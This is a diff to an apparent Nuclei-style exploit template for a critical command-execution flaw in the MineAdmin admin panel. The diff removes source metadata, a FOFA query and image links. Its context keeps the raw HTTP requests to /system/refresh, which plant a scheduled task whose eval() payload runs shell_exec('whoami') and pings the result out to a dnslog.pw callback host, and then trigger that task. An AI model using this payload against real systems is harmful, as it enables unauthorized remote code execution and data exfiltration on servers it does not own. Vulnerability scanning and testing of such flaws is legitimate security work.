@@ -3,12 +3,8 @@ info:
   name: MineAdmin企业级后台管理系统refresh存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wcid3dw68hxn34ip'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wcid3dw68hxn34ip
-    fofa: body="MineAdmin"
 http:
 - raw:
   - 'POST /system/refresh HTTP/1.1
@@ -25,7 +21,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Accept-Language: zh_CN![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238284358-1b44081a-db6f-41d9-95cb-96f2210ea35d.png)
+    Accept-Language: zh_CN
 
     POC/EXP：添加恶意命令（此处用dnslog回显命令）
 
@@ -57,7 +53,6 @@ http:
 
     {"singleton":"2","status":"1","name":"test","type":"4","rule":"30 */5 * * * *","target":"eval(''$user = shell_exec(\"whoami\"); system(\"ping -n 1 \" . trim($user) . \".5yzhle6v.dnslog.pw\");'');"}
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238284703-c6e31f7c-9575-482c-af86-a2d66a2fff32.png)
 
     POC/EXP：执行恶意命令'
   redirects: false
@@ -85,11 +80,7 @@ http:
     Content-Length: 8
 
 
-    {"id":2}
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238285099-287b7559-5584-48ec-b100-c29da8f55a18.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238285627-5d92ae6c-077a-414f-b104-1d6ea28c92e7.png)'
+    {"id":2}'
   redirects: false
   matchers:
   - status:
